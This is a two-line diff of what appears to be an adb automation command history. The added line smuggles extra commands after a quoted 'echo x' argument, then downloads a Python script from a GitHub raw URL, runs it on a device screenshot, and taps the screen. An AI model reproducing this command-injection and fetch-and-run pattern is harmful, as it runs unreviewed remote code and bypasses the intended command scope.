@@ -1,2 +1,2 @@
-shell "sed 's/></>\n</g' /sdcard/w9.xml | grep 'clickable=\"true\"' | sed 's/.*text=/text=/;s/resource-id.*bounds=/ bounds=/;s/ >//' | cut -c1-160"
-#1792906059
+shell "echo x"; A=/usr/local/lib/android/sdk/platform-tools/adb; curl -sL -o /tmp/su.py 'https://raw.githubusercontent.com/zhaoyi-habs/mw-runner/main/shotup.py'; $A shell input tap 961 891; sleep 1; $A exec-out screencap -p > /tmp/t1.png; python3 /tmp/su.py /tmp/t1.png toast1
+#1792906080
